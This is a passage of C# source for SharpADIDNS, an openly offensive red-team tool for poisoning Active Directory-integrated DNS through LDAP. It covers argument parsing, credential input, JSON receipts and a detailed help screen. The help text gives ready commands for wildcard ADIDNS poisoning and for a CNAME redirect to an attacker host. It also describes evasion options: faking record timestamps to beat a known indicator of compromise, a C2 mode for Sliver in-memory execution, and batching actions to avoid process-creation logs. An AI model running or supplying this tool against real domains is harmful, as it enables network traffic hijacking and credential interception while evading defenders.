                    sb.Append("\"tombstone\":true,");
                    break;
            }

            sb.AppendFormat("\"blob_base64\":\"{0}\"", Convert.ToBase64String(data));
            sb.Append("}");
        }

        // -------- write-action JSON receipts (only when opt.Format == "json") --------
        private static void EmitAddReceipt(Options opt, string nodeDn, byte[] newRecord,
                                           ushort recordType, string dataDesc,
                                           NodeSnapshot prev, string operation,
                                           SetOwnerResult setOwner)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("{");
            sb.Append("\"action\":\"add\",");
            sb.Append("\"result\":\"ok\",");
            sb.AppendFormat("\"operation\":\"{0}\",", operation);
            sb.AppendFormat("\"dn\":\"{0}\",",   Json.Escape(nodeDn));
            sb.AppendFormat("\"zone\":\"{0}\",", Json.Escape(opt.Zone));
            sb.AppendFormat("\"name\":\"{0}\",", Json.Escape(opt.Name));
            sb.Append("\"record\":");
            WriteRecordJson(sb, newRecord);
            sb.Append(",");
            sb.Append("\"previous_state\":");
            WriteSnapshotJson(sb, prev);
            sb.Append(",");
            sb.Append("\"reverse\":");
            if (operation == "create")
                sb.Append("\"").Append(Json.Escape(BuildReverseCommand(opt, "remove"))).Append("\"");
            else
                sb.Append("null");
            if (setOwner != null && setOwner.Attempted)
            {
                sb.Append(",\"set_owner\":");
                WriteSetOwnerJson(sb, setOwner);
            }
            sb.Append("}");
            Console.WriteLine(sb.ToString());
        }

        private static void WriteSetOwnerJson(StringBuilder sb, SetOwnerResult r)
        {
            sb.Append("{");
            sb.AppendFormat("\"requested\":\"{0}\",", Json.Escape(r.Requested));
            sb.AppendFormat("\"result\":\"{0}\"", r.Success ? "ok" : "error");
            if (!string.IsNullOrEmpty(r.AppliedSid))
                sb.AppendFormat(",\"applied_to_sid\":\"{0}\"", Json.Escape(r.AppliedSid));
            if (!string.IsNullOrEmpty(r.Error))
                sb.AppendFormat(",\"error\":\"{0}\"", Json.Escape(r.Error));
            sb.Append("}");
        }

        private static void EmitDisableReceipt(Options opt, string nodeDn, NodeSnapshot prev)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("{");
            sb.Append("\"action\":\"disable\",");
            sb.Append("\"result\":\"ok\",");
            sb.AppendFormat("\"dn\":\"{0}\",",   Json.Escape(nodeDn));
            sb.AppendFormat("\"zone\":\"{0}\",", Json.Escape(opt.Zone));
            sb.AppendFormat("\"name\":\"{0}\",", Json.Escape(opt.Name));
            sb.Append("\"previous_state\":");
            WriteSnapshotJson(sb, prev);
            sb.Append(",\"reverse\":null");
            sb.Append("}");
            Console.WriteLine(sb.ToString());
        }

        private static void EmitRemoveReceipt(Options opt, string nodeDn, NodeSnapshot prev)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("{");
            sb.Append("\"action\":\"remove\",");
            sb.Append("\"result\":\"ok\",");
            sb.AppendFormat("\"dn\":\"{0}\",",   Json.Escape(nodeDn));
            sb.AppendFormat("\"zone\":\"{0}\",", Json.Escape(opt.Zone));
            sb.AppendFormat("\"name\":\"{0}\",", Json.Escape(opt.Name));
            sb.Append("\"previous_state\":");
            WriteSnapshotJson(sb, prev);
            sb.Append(",\"reverse\":null");
            sb.Append("}");
            Console.WriteLine(sb.ToString());
        }

        private static void WriteSnapshotJson(StringBuilder sb, NodeSnapshot snap)
        {
            if (snap == null)
            {
                sb.Append("null");
                return;
            }
            sb.Append("{");
            sb.AppendFormat("\"tombstoned\":{0},", snap.Tombstoned ? "true" : "false");
            sb.Append("\"records_base64\":[");
            for (int i = 0; i < snap.Records.Count; i++)
            {
                if (i > 0) sb.Append(",");
                sb.Append("\"").Append(Convert.ToBase64String(snap.Records[i])).Append("\"");
            }
            sb.Append("]}");
        }

        private static string BuildReverseCommand(Options opt, string verb)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("SharpADIDNS.exe ").Append(verb);
            sb.Append(" --zone ").Append(opt.Zone);
            sb.Append(" --name ");
            if (opt.Name.IndexOfAny(new[] { ' ', '*', '\t' }) >= 0)
                sb.Append("\"").Append(opt.Name).Append("\"");
            else
                sb.Append(opt.Name);
            sb.Append(" --dn ").Append(opt.DomainDn);
            if (!string.IsNullOrEmpty(opt.Server))   sb.Append(" --server ").Append(opt.Server);
            if (opt.Partition != "DomainDnsZones")   sb.Append(" --partition ").Append(opt.Partition);
            sb.Append(" --yes");
            return sb.ToString();
        }

        // -------- query permissions printer --------
        private static void PrintNodePermissions(Options opt, DirectoryEntry node)
        {
            Console.WriteLine();
            Console.WriteLine("[*] Permissions:");

            ActiveDirectorySecurity sec;
            try
            {
                sec = node.ObjectSecurity;
            }
            catch (Exception ex)
            {
                Logger.Warn("Could not read nTSecurityDescriptor: {0}", ex.Message);
                return;
            }

            if (sec == null)
            {
                Console.WriteLine("    <security descriptor unavailable>");
                return;
            }

            // Owner
            try
            {
                IdentityReference owner = sec.GetOwner(typeof(NTAccount));
                Console.WriteLine("    Owner: {0}", owner != null ? owner.Value : "<null>");
            }
            catch (Exception ex)
            {
                Console.WriteLine("    Owner: <error: {0}>", ex.Message);
            }

            // Group (rarely useful but cheap)
            try
            {
                IdentityReference grp = sec.GetGroup(typeof(NTAccount));
                if (grp != null && opt.Verbose)
                    Console.WriteLine("    Group: {0}", grp.Value);
            }
            catch { /* ignored */ }

            // DACL
            AuthorizationRuleCollection rules;
            try
            {
                rules = sec.GetAccessRules(true, true, typeof(NTAccount));
            }
            catch (Exception ex)
            {
                Console.WriteLine("    ACEs: <error: {0}>", ex.Message);
                return;
            }

            int explicitCount = 0, inheritedCount = 0;
            List<ActiveDirectoryAccessRule> shown = new List<ActiveDirectoryAccessRule>();
            foreach (AuthorizationRule rule in rules)
            {
                ActiveDirectoryAccessRule ar = rule as ActiveDirectoryAccessRule;
                if (ar == null) continue;
                if (ar.IsInherited) inheritedCount++;
                else                explicitCount++;
                if (opt.Verbose || !ar.IsInherited) shown.Add(ar);
            }

            if (opt.Verbose)
                Console.WriteLine("    ACEs: {0} explicit, {1} inherited", explicitCount, inheritedCount);
            else
                Console.WriteLine("    ACEs: {0} explicit, {1} inherited (use -v to expand inherited)",
                    explicitCount, inheritedCount);

            foreach (ActiveDirectoryAccessRule ar in shown)
            {
                string id = ar.IdentityReference != null ? ar.IdentityReference.Value : "<null>";
                Console.WriteLine("      {0,-5} {1,-48} {2}{3}",
                    ar.AccessControlType,
                    id,
                    ar.ActiveDirectoryRights,
                    ar.IsInherited ? "  [inherited]" : "");
            }
        }
    }

    // -----------------------------------------------------------------------
    // CLI parsing and help
    // -----------------------------------------------------------------------
    internal sealed class Options
    {
        // Action
        public string Action;
        public bool   ShowHelp;
        public bool   ShowVersion;

        public Options Clone()
        {
            return (Options)this.MemberwiseClone();
        }

        // Targeting
        public string Zone;
        public string Name;
        public string DomainDn;
        public string Partition = "DomainDnsZones";
        public string Server;

        // Record data
        public string RecordType = "A";
        public string Data;
        public int    Ttl = 600;
        public string RawBase64;
        public bool   Force;
        public bool   Append;
        public bool   MimicAging;
        public string SetOwner;
        public int    SrvPriority = 0;
        public int    SrvWeight   = 0;
        public int    SrvPort     = -1;
        public int    MxPref      = 10;

        // Auth
        public string Username;
        public string Password;
        public bool   PasswordStdin;
        public string PasswordEnvVar;
        public string PasswordBase64;
        public bool   AllowCleartextPassword;
        public bool   Ldaps;

        // Output
        public bool Verbose;
        public bool Quiet;
        public string Format = "text";
        public bool Color;
        public bool NoColor;

        // Safety
        public bool   DryRun;
        public string BackupTo;
        public bool   Yes;
        public bool   RequirePdc;
        public bool   ShowPdc;
        public bool   C2;
        public string Script;
        public string ScriptOnError = "halt";

        // Enum filters
        public string FilterType;
        public string FilterName;
        public bool   OnlyTombstoned;
        public bool   NoTombstoned;

        private static readonly HashSet<string> KnownActions =
            new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            { "enum", "query", "add", "disable", "remove", "list-zones" };

        public static Options Parse(string[] args)
        {
            // Expand @argfile.txt before parsing.
            args = ExpandArgfiles(args);

            Options o = new Options();
            ApplyArgs(o, args);
            return o;
        }

        internal static void ApplyArgs(Options o, string[] args)
        {

            for (int i = 0; i < args.Length; i++)
            {
                string a = args[i];

                if (KnownActions.Contains(a))
                {
                    if (o.Action != null)
                        Logger.Warn("Multiple actions given, using last: {0}", a);
                    o.Action = a.ToLowerInvariant();
                    continue;
                }

                if (a == "-h" || a == "--help" || a == "/?" || a == "/help")
                {
                    o.ShowHelp = true;
                    continue;
                }

                if (a == "-V" || a == "--version")
                {
                    o.ShowVersion = true;
                    continue;
                }

                if (a == "--zone"        && i + 1 < args.Length) o.Zone       = args[++i];
                else if (a == "--name"   && i + 1 < args.Length) o.Name       = args[++i];
                else if ((a == "--data" || a == "--ip") && i + 1 < args.Length) o.Data = args[++i];
                else if (a == "--type"   && i + 1 < args.Length) o.RecordType = args[++i];
                else if (a == "--raw"    && i + 1 < args.Length) o.RawBase64  = args[++i];
                else if (a == "--srv-priority" && i + 1 < args.Length) o.SrvPriority = ParseUint16Arg("--srv-priority", args[++i]);
                else if (a == "--srv-weight"   && i + 1 < args.Length) o.SrvWeight   = ParseUint16Arg("--srv-weight",   args[++i]);
                else if (a == "--srv-port"     && i + 1 < args.Length) o.SrvPort     = ParseUint16Arg("--srv-port",     args[++i]);
                else if (a == "--mx-pref"      && i + 1 < args.Length) o.MxPref      = ParseUint16Arg("--mx-pref",      args[++i]);
                else if (a == "--dn" && i + 1 < args.Length) o.DomainDn = args[++i];
                else if (a == "--partition" && i + 1 < args.Length) o.Partition = args[++i];
                else if (a == "--server" && i + 1 < args.Length) o.Server     = args[++i];
                else if (a == "--ttl"    && i + 1 < args.Length)
                {
                    string raw = args[++i];
                    int ttl;
                    if (!int.TryParse(raw, out ttl) || ttl < 1 || ttl > 604800)
                        throw new ArgumentException("--ttl must be an integer in 1..604800 (got: " + raw + ")");
                    o.Ttl = ttl;
                }
                else if (a == "--username" && i + 1 < args.Length) o.Username = args[++i];
                else if (a == "--password" && i + 1 < args.Length) o.Password = args[++i];
                else if (a == "--password-stdin")                  o.PasswordStdin = true;
                else if (a == "--password-env" && i + 1 < args.Length) o.PasswordEnvVar = args[++i];
                else if (a == "--password-base64" && i + 1 < args.Length) o.PasswordBase64 = args[++i];
                else if (a == "--allow-cleartext-password")        o.AllowCleartextPassword = true;
                else if (a == "--ldaps")                            o.Ldaps    = true;
                else if (a == "--force")                            o.Force    = true;
                else if (a == "--append")                           o.Append   = true;
                else if (a == "--mimic-aging")                      o.MimicAging = true;
                else if (a == "--set-owner" && i + 1 < args.Length) o.SetOwner = args[++i];
                else if (a == "-v" || a == "--verbose")             o.Verbose  = true;
                else if (a == "-q" || a == "--quiet")               o.Quiet    = true;
                else if (a == "--format" && i + 1 < args.Length)    o.Format   = args[++i].ToLowerInvariant();
                else if (a == "--color")                            o.Color    = true;
                else if (a == "--no-color")                         o.NoColor  = true;
                else if (a == "--dry-run")                          o.DryRun   = true;
                else if (a == "--backup-to" && i + 1 < args.Length) o.BackupTo = args[++i];
                else if (a == "-y" || a == "--yes")                 o.Yes      = true;
                else if (a == "--require-pdc")                      o.RequirePdc = true;
                else if (a == "--show-pdc")                         o.ShowPdc    = true;
                else if (a == "--c2")                               o.C2         = true;
                else if (a == "--script" && i + 1 < args.Length)    o.Script     = args[++i];
                else if (a == "--script-on-error" && i + 1 < args.Length)
                {
                    string mode = args[++i].ToLowerInvariant();
                    if (mode != "halt" && mode != "continue")
                        throw new ArgumentException("--script-on-error must be 'halt' or 'continue'");
                    o.ScriptOnError = mode;
                }
                else if (a == "--filter-type" && i + 1 < args.Length) o.FilterType = args[++i];
                else if (a == "--filter-name" && i + 1 < args.Length) o.FilterName = args[++i];
                else if (a == "--only-tombstoned")                  o.OnlyTombstoned = true;
                else if (a == "--no-tombstoned")                    o.NoTombstoned   = true;
                else
                    Logger.Warn("Ignored unknown argument: {0}", a);
            }

            // Password resolution happens after Parse via Credentials.Resolve(opt) -- see Program.Main.
        }

        private static int ParseUint16Arg(string name, string raw)
        {
            int v;
            if (!int.TryParse(raw, out v) || v < 0 || v > 65535)
                throw new ArgumentException(name + " must be an integer in 0..65535 (got: " + raw + ")");
            return v;
        }

        private static string[] ExpandArgfiles(string[] args)
        {
            List<string> expanded = new List<string>();
            foreach (string a in args)
            {
                if (a == null || a.Length < 2 || a[0] != '@')
                {
                    expanded.Add(a);
                    continue;
                }

                string path = a.Substring(1);
                string content;
                try { content = File.ReadAllText(path); }
                catch (Exception ex)
                {
                    throw new ArgumentException(
                        "Could not read argfile '" + path + "': " + ex.Message);
                }

                foreach (string rawLine in content.Split('\n'))
                {
                    string line = rawLine.Trim();
                    if (line.Length == 0) continue;
                    if (line[0] == '#') continue;
                    foreach (string tok in line.Split(
                        new[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries))
                        expanded.Add(tok);
                }
            }
            return expanded.ToArray();
        }

        // ----- Help -----
        public static void PrintUsage()
        {
            PrintHeader();
            PrintSynopsis();
            PrintActions();
            PrintTargeting();
            PrintRecordData();
            PrintAuth();
            PrintSafety();
            PrintEnumFilters();
            PrintOutput();
            PrintExitCodes();
            PrintExamples();
            PrintNotes();
        }

        private static void PrintHeader()
        {
            Console.WriteLine();
            Console.WriteLine("SharpADIDNS v" + Program.Version + "  --  AD-Integrated DNS manipulation via LDAP");
            Console.WriteLine("https://github.com/RedteamNotes/SharpADIDNS");
            Console.WriteLine("By @RedteamNotes   Email: 888256@gmail.com");
            Console.WriteLine();
            Console.WriteLine("  Tip: any argument may be replaced by '@file.txt' to read more args");
            Console.WriteLine("  from that file (one per whitespace; '#' starts a line comment).");
            Console.WriteLine();
        }

        private static void PrintSynopsis()
        {
            Console.WriteLine("USAGE");
            Console.WriteLine("  SharpADIDNS.exe <action> [options]");
            Console.WriteLine();
        }

        private static void PrintActions()
        {
            Console.WriteLine("ACTIONS");
            Console.WriteLine("  enum                   List dnsNode objects under a zone");
            Console.WriteLine("  query                  Read one dnsNode and decode its dnsRecord blob(s)");
            Console.WriteLine("  add                    Create or update a record (A/AAAA/CNAME/TXT/PTR/SRV/MX or raw)");
            Console.WriteLine("  disable                Tombstone a node (soft delete, object preserved)");
            Console.WriteLine("  remove                 Hard-delete the dnsNode object");
            Console.WriteLine("  list-zones             Enumerate dnsZone objects across all 3 partitions");
            Console.WriteLine();
        }

        private static void PrintTargeting()
        {
            Console.WriteLine("TARGETING");
            Console.WriteLine("  --zone <fqdn>          DNS zone, e.g. corp.local                       [required]");
            Console.WriteLine("  --name <label>         Record name ('@' = apex, '*' = wildcard)        [required*]");
            Console.WriteLine("  --dn <DN>              Naming context, e.g. DC=corp,DC=local           [required]");
            Console.WriteLine("  --partition <name>     DomainDnsZones (default) | ForestDnsZones | System");
            Console.WriteLine("  --server <host>        Target DC FQDN or IP  (default: serverless bind)");
            Console.WriteLine("                         * --name is not required for the 'enum' action");
            Console.WriteLine();
        }

        private static void PrintRecordData()
        {
            Console.WriteLine("RECORD DATA  (add only)");
            Console.WriteLine("  --type <T>             A | AAAA | CNAME | TXT | PTR | SRV | MX   (default: A)");
            Console.WriteLine("  --data <value>         A/AAAA     : IP literal");
            Console.WriteLine("                         CNAME/PTR  : target FQDN");
            Console.WriteLine("                         TXT        : up to 255 bytes of ASCII");
            Console.WriteLine("                         SRV        : target FQDN  (+ --srv-port etc.)");
            Console.WriteLine("                         MX         : exchange FQDN  (+ --mx-pref)");
            Console.WriteLine("                         (alias: --ip)");
            Console.WriteLine("  --srv-priority <N>     SRV priority,  0..65535                    (default: 0)");
            Console.WriteLine("  --srv-weight <N>       SRV weight,    0..65535                    (default: 0)");
            Console.WriteLine("  --srv-port <N>         SRV port,      0..65535                    (required for SRV)");
            Console.WriteLine("  --mx-pref <N>          MX preference, 0..65535                    (default: 10)");
            Console.WriteLine("  --raw <base64>         Inject a pre-built dnsRecord blob; bypasses --type/--data");
            Console.WriteLine("  --ttl <seconds>        TTL, 1..604800                            (default: 600)");
            Console.WriteLine("  --force                Replace SAME-type records on existing node;");
            Console.WriteLine("                         other record types on the same node are preserved");
            Console.WriteLine("  --append               Keep ALL existing records on the node and add one");
            Console.WriteLine("                         more. Mutually exclusive with --force. Refuses on");
            Console.WriteLine("                         tombstoned nodes (use --force to un-tombstone).");
            Console.WriteLine("  --mimic-aging          Set the dnsRecord Timestamp field (hours since");
            Console.WriteLine("                         1601-01-01 UTC) to 'now' instead of 0. Defeats");
            Console.WriteLine("                         the 'Timestamp=0 in a dynamic-update zone' IOC.");
            Console.WriteLine("                         No effect on --raw (caller controls the blob).");
            Console.WriteLine("  --set-owner <SID|name> After add, set the dnsNode owner to the given");
            Console.WriteLine("                         identity (SID 'S-1-...' or 'DOMAIN\\user'). Needs");
            Console.WriteLine("                         WriteOwner on the node. Failure does NOT roll back");
            Console.WriteLine("                         the record; receipt's 'set_owner' field reports");
            Console.WriteLine("                         the outcome.");
            Console.WriteLine();
        }

        private static void PrintAuth()
        {
            Console.WriteLine("AUTHENTICATION");
            Console.WriteLine("  --username <user>           UPN or DOMAIN\\user  (default: current process token)");
            Console.WriteLine("  --password <pwd>            Cleartext password (visible in process listing).");
            Console.WriteLine("                              Warns unless --allow-cleartext-password.");
            Console.WriteLine("  --password-stdin            Read password from stdin (one line)");
            Console.WriteLine("  --password-env <VAR>        Read password from environment variable");
            Console.WriteLine("  --password-base64 <b64>     UTF-8 password as base64 (shell-safe transport)");
            Console.WriteLine("  --allow-cleartext-password  Silence the --password cleartext warning");
            Console.WriteLine("  --ldaps                     Bind over LDAPS (port 636)");
            Console.WriteLine();
            Console.WriteLine("  When --username is given without any password source, the password is");
            Console.WriteLine("  prompted interactively (input not echoed). Fails if stdin is redirected.");
            Console.WriteLine();
        }

        private static void PrintSafety()
        {
            Console.WriteLine("SAFETY");
            Console.WriteLine("  --c2                   Umbrella for in-memory / unattended execution");
            Console.WriteLine("                         (Sliver execute-assembly, CI, scripted ops).");
            Console.WriteLine("                         Implicit defaults (each can be overridden):");
            Console.WriteLine("                           --allow-cleartext-password  (no FUD warning)");
            Console.WriteLine("                           --yes                       (no prompts)");
            Console.WriteLine("                           --no-color                  (clean stdout)");
            Console.WriteLine("                           --quiet                     (less channel noise)");
            Console.WriteLine("                           --format json               (machine-readable)");
            Console.WriteLine("                           --backup-to -               (stdout, no disk)");
            Console.WriteLine("                         Pair with --password-base64 <b64> for clean");
            Console.WriteLine("                         credential transport across shell layers.");
            Console.WriteLine("  --script \"stmt; stmt\"  Run multiple actions in one invocation. Statements");
            Console.WriteLine("                         are ';' separated; each is action+flags (overrides");
            Console.WriteLine("                         outer flags). Outer must not also specify an action.");
            Console.WriteLine("                         Saves N-1 sacrificial-process spawns / EID 1 events.");
            Console.WriteLine("  --script-on-error <m>  halt | continue   (default: halt)");
            Console.WriteLine("  --dry-run              Show what would change; do not write to AD");
            Console.WriteLine("  --backup-to <file|->   Append a JSON line per affected node before");
            Console.WriteLine("                         modifying it. Use '-' to write to stdout instead");
            Console.WriteLine("                         of a file (no disk artifact -- useful when running");
            Console.WriteLine("                         in-memory via Sliver execute-assembly etc.). One");
            Console.WriteLine("                         file accumulates entries across runs. Fields:");
            Console.WriteLine("                         _type='backup', timestamp, action, dn,");
            Console.WriteLine("                         dNSTombstoned, records (base64-encoded blobs).");
            Console.WriteLine("                         Restore via 'add --raw <base64> --force'.");
            Console.WriteLine("                         In --format json mode, the action receipt already");
            Console.WriteLine("                         carries previous_state, so '--backup-to -' is");
            Console.WriteLine("                         suppressed to avoid duplicate stdout output.");
            Console.WriteLine("  -y, --yes              Skip interactive confirmation on high-risk ops:");
            Console.WriteLine("                           - any 'remove'");
            Console.WriteLine("                           - 'add --name \"*\"' (wildcard)");
            Console.WriteLine("                           - 'add --name wpad|isatap' (GQBL-monitored)");
            Console.WriteLine("                           - 'add --force' on a tombstoned node");
            Console.WriteLine("                         Without a TTY and without --yes, high-risk ops");
            Console.WriteLine("                         refuse to run.");
            Console.WriteLine("  --show-pdc             Look up and print the PDC emulator hostname");
            Console.WriteLine("                         before running the action.");
            Console.WriteLine("  --require-pdc          Error out unless --server matches the PDC.");
            Console.WriteLine("                         Avoids writing to a non-PDC replica whose change");
            Console.WriteLine("                         takes minutes to propagate (and shows up in");
            Console.WriteLine("                         replPropertyMetaData under a non-PDC DSA).");
            Console.WriteLine();
        }

        private static void PrintEnumFilters()
        {
            Console.WriteLine("ENUM FILTERS  (enum only)");
            Console.WriteLine("  --filter-type <T,...>  Comma list. Show nodes with at least one record");
            Console.WriteLine("                         of these types: A,AAAA,CNAME,PTR,SRV,MX,TXT,NS,SOA,TS");
            Console.WriteLine("  --filter-name <glob>   Match the node name; '*' and '?' wildcards,");
            Console.WriteLine("                         case-insensitive (e.g. 'sql*' or '_*._tcp.*')");
            Console.WriteLine("  --only-tombstoned      Show only tombstoned nodes");
            Console.WriteLine("  --no-tombstoned        Hide tombstoned nodes (active only)");
            Console.WriteLine();
        }

        private static void PrintOutput()
        {
            Console.WriteLine("OUTPUT");
            Console.WriteLine("  -v, --verbose          Print DNs, raw blobs, bind details");
            Console.WriteLine("  -q, --quiet            Suppress [*] info lines");
            Console.WriteLine("  --format <text|json>   Output format for enum / query / list-zones");
            Console.WriteLine("                         (default: text). JSON is single-line, suitable");
            Console.WriteLine("                         for piping through 'jq'.");
            Console.WriteLine("  --color                Force ANSI color in output");
            Console.WriteLine("  --no-color             Disable ANSI color (default: auto-detect TTY)");
            Console.WriteLine("  -h, --help             Show this help");
            Console.WriteLine("  -V, --version          Print version and exit");
            Console.WriteLine();
        }

        private static void PrintExitCodes()
        {
            Console.WriteLine("EXIT CODES");
            Console.WriteLine("  0   success");
            Console.WriteLine("  1   usage / argument error");
            Console.WriteLine("  2   LDAP / AD operation failed   (see stderr for ExtendedError)");
            Console.WriteLine("  3   target object not found");
            Console.WriteLine("  4   access denied");
            Console.WriteLine();
        }

        private static void PrintExamples()
        {
            Console.WriteLine("EXAMPLES");
            Console.WriteLine("  # Recon: enumerate every dnsNode in the zone");
            Console.WriteLine("  SharpADIDNS.exe enum --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local");
            Console.WriteLine();
            Console.WriteLine("  # Read one record");
            Console.WriteLine("  SharpADIDNS.exe query --zone redteamnotes.local --name sccm --dn DC=redteamnotes,DC=local");
            Console.WriteLine();
            Console.WriteLine("  # Wildcard A injection (classic ADIDNS poisoning)");
            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name \"*\" --type A --data 10.0.0.66 --dn DC=redteamnotes,DC=local --ttl 600");
            Console.WriteLine();
            Console.WriteLine("  # AAAA record with explicit creds over LDAPS");
            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name web --type AAAA --data fe80::1 --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local --username redteamnotes\\redpen --password 'RedteamN0t3s.' --ldaps");
            Console.WriteLine();
            Console.WriteLine("  # CNAME redirect (preserves any AAAA on the same node)");
            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name printer --type CNAME --data attacker.redteamnotes.local --dn DC=redteamnotes,DC=local --force");
            Console.WriteLine();
            Console.WriteLine("  # Soft-delete (tombstone) instead of hard remove");
            Console.WriteLine("  SharpADIDNS.exe disable --zone redteamnotes.local --name wpad --dn DC=redteamnotes,DC=local");
            Console.WriteLine();
        }

        private static void PrintNotes()
        {
            Console.WriteLine("NOTES");
            Console.WriteLine("  * Any authenticated domain user can create new dnsNode objects by");
            Console.WriteLine("    default. Existing nodes are owned by their creator; modifying them");
            Console.WriteLine("    requires explicit ACEs (creator, DnsAdmins, or a delegated ACL).");
            Console.WriteLine("  * 'wpad' and 'isatap' are blocked by the DNS server's Global Query");
            Console.WriteLine("    Block List (GQBL) since Server 2008 -- the record will exist in AD");
            Console.WriteLine("    but the server refuses to answer queries. GQBL is a DNS-server");
            Console.WriteLine("    registry setting, NOT visible via LDAP.");
            Console.WriteLine("  * 'disable' (tombstone) is more OPSEC-friendly than 'remove': the");
            Console.WriteLine("    object stays in AD with dNSTombstoned=TRUE and is scavenged by AD");
            Console.WriteLine("    after the DsTombstoneInterval (default 14 days).");
            Console.WriteLine("  * Wildcard ('*') records hijack every unresolved name in the zone.");
            Console.WriteLine("    Use 'enum' first to confirm you are not stomping legitimate data.");
            Console.WriteLine();
        }
    }

    // -----------------------------------------------------------------------
    // Credential input resolution
    // -----------------------------------------------------------------------
    internal static class Credentials
    {
        public static void Resolve(Options opt)
        {
            if (string.IsNullOrEmpty(opt.Username)) return;

            int sources = 0;
            if (opt.Password != null)                       sources++;
            if (opt.PasswordStdin)                          sources++;
            if (!string.IsNullOrEmpty(opt.PasswordEnvVar))  sources++;
            if (!string.IsNullOrEmpty(opt.PasswordBase64))  sources++;

            if (sources > 1)
                throw new ArgumentException(
                    "Specify at most one of --password / --password-stdin / --password-env / --password-base64");

            if (opt.Password != null)
            {
                if (!opt.AllowCleartextPassword)
                    Logger.Warn(
                        "--password is visible in process listings (Sysmon EID 1, " +
                        "Win32_Process commandLine) and shell history. Prefer " +
                        "--password-stdin, --password-env <VAR>, --password-base64 <b64>, " +
                        "or omit it to be prompted. Use --allow-cleartext-password " +
                        "to silence this.");
                return;
            }

            if (opt.PasswordStdin)
            {
                opt.Password = ReadOneLineFromStdin();
                return;
            }

            if (!string.IsNullOrEmpty(opt.PasswordEnvVar))
            {
                string val = Environment.GetEnvironmentVariable(opt.PasswordEnvVar);
                if (val == null)
                    throw new ArgumentException(
                        "--password-env " + opt.PasswordEnvVar +
                        " is not set in this process environment");
                opt.Password = val;
                return;
            }

            if (!string.IsNullOrEmpty(opt.PasswordBase64))
            {
                try
                {
                    byte[] raw = Convert.FromBase64String(opt.PasswordBase64);
                    opt.Password = Encoding.UTF8.GetString(raw);
                }
                catch (FormatException)
                {
                    throw new ArgumentException(
                        "--password-base64 is not valid base64");
                }
                return;
            }

            // No source given. Auto-prompt if interactive; refuse otherwise.
            if (Console.IsInputRedirected)
                throw new ArgumentException(
                    "--username given without a password source and stdin is " +
                    "redirected. Use --password-stdin, --password-env <VAR>, or " +
                    "--password <pwd> (with --allow-cleartext-password), or run " +
                    "interactively.");

            opt.Password = PromptMasked("Password for " + opt.Username + ": ");
        }

        private static string ReadOneLineFromStdin()
        {
            string line = Console.In.ReadLine();
            if (line == null)
                throw new ArgumentException(
                    "--password-stdin: stdin closed before any input was received");
            return line;
        }

        private static string PromptMasked(string prompt)
        {
            Console.Error.Write(prompt);
            StringBuilder sb = new StringBuilder();
            while (true)
            {
                ConsoleKeyInfo k = Console.ReadKey(true);
                if (k.Key == ConsoleKey.Enter) break;
                if (k.Key == ConsoleKey.Backspace)
                {
                    if (sb.Length > 0) sb.Length--;
                    continue;
                }
                if (k.KeyChar == '\0') continue;
                sb.Append(k.KeyChar);
            }
            Console.Error.WriteLine();
            return sb.ToString();
        }
    }

    // -----------------------------------------------------------------------
    // Minimal JSON helpers (reused by Backup and the --format json output)
    // -----------------------------------------------------------------------
    internal static class Json
    {
        public static string Escape(string s)
        {
            if (s == null) return "";
            StringBuilder sb = new StringBuilder(s.Length + 2);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\\\"); break;
                    case '"':  sb.Append("\\\""); break;
                    case '\b': sb.Append("\\b");  break;
                    case '\f': sb.Append("\\f");  break;
                    case '\n': sb.Append("\\n");  break;
                    case '\r': sb.Append("\\r");  break;
                    case '\t': sb.Append("\\t");  break;
                    default:
                        if (c < 0x20) sb.AppendFormat("\\u{0:X4}", (int)c);
                        else sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }
    }

    // -----------------------------------------------------------------------
    // --backup-to JSONL snapshot writer
    // -----------------------------------------------------------------------
    internal static class Backup
    {
        public static void Snapshot(Options opt, string nodeDn, string action,
                                    Actions.NodeSnapshot snap)
        {
            if (string.IsNullOrEmpty(opt.BackupTo)) return;

            // In --format json mode with stdout sentinel, the action receipt
            // already carries previous_state -- avoid duplicating it on stdout.
            bool toStdout = opt.BackupTo == "-";
            if (toStdout && opt.Format == "json") return;

            bool tomb = snap != null && snap.Tombstoned;
            int recordCount = snap == null ? 0 : snap.Records.Count;

            StringBuilder json = new StringBuilder();
            json.Append("{");
            json.Append("\"_type\":\"backup\",");
            json.Append("\"timestamp\":\"").Append(DateTime.UtcNow.ToString("o")).Append("\",");
            json.Append("\"action\":\"").Append(Json.Escape(action)).Append("\",");
            json.Append("\"dn\":\"").Append(Json.Escape(nodeDn)).Append("\",");
            json.Append("\"dNSTombstoned\":").Append(tomb ? "true" : "false").Append(",");
            json.Append("\"records\":[");
            if (snap != null)
            {
                for (int i = 0; i < snap.Records.Count; i++)
                {
                    if (i > 0) json.Append(",");
                    json.Append("\"").Append(Convert.ToBase64String(snap.Records[i])).Append("\"");
                }
            }
            json.Append("]}");

            if (toStdout)
            {
                Console.WriteLine(json.ToString());
                Logger.Info(opt, "Snapshot emitted on stdout ({0} record(s))", recordCount);
            }
            else
            {
                try
                {
                    File.AppendAllText(opt.BackupTo, json.ToString() + "\n", Encoding.UTF8);
                }
                catch (Exception ex)
                {
                    throw new IOException(
                        "Failed to write --backup-to file '" + opt.BackupTo + "': " + ex.Message, ex);
                }
                Logger.Info(opt, "Snapshot appended to: {0} ({1} record(s))", opt.BackupTo, recordCount);
            }
        }
    }

    // -----------------------------------------------------------------------
    // High-risk operation confirmation
    // -----------------------------------------------------------------------
    internal static class Safety
    {
        public static bool ConfirmIfHighRisk(Options opt, DirectoryEntry existingNode)
        {
            string reason = DetectReason(opt, existingNode);
            if (reason == null) return true;

            if (opt.Yes)
            {
                Logger.Info(opt, "High-risk: {0} (--yes given, proceeding)", reason);
                return true;
            }

            if (Console.IsInputRedirected)
            {
                Logger.Err("High-risk op refused: stdin not a TTY and --yes not set.");
